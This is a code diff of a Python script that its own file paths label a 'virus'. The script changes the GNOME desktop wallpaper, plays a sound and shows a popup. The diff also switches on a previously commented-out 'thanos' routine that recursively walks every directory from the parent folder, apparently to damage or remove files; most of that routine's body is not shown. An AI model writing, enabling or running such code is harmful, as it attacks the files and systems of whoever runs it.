@@ -3,8 +3,10 @@ import os
 import asyncio
 from playsound import playsound
 
+username = os.getlogin()
 
-wallpaper = [
+
+bg = [
     "wallpaper1.jpeg",
     "wallpaper2.jpeg",
     "wallpaper3.jpg"
@@ -34,13 +36,13 @@ def popUp():
     root.mainloop()
 
 def wallpaper(number):
-    os.system("gsettings set org.gnome.desktop.background picture-uri file:///home/"+ username +"/virus/" + wallpaper[number])
+    os.system("gsettings set org.gnome.desktop.background picture-uri file:///home/"+ username +"/virus/" + bg[number])
 
 def bgSound():
     playsound('bgSound.mp3',0)
 
 
-def thanos(dossier):
+async def thanos(dossier):
     for nom_fichier in os.scandir(dossier):
         if nom_fichier.name != 'virus':
             if nom_fichier.is_dir():
@@ -60,15 +62,15 @@ def thanos(dossier):
                     print('Mixmax')
 
 
-bgSound()
-wallpaper(0)
-#thanos('../')
-print('Thanos')
-wallpaper(1)
-delay(500)
-wallpaper(2)
-popUp()
+async def main():
+    bgSound()
+    wallpaper(0)
+    task = asyncio.create_task(thanos('../'))
+    wallpaper(1)
 
+    await task
+    wallpaper(2)
+    popUp()
 
-
+asyncio.run(main())
 
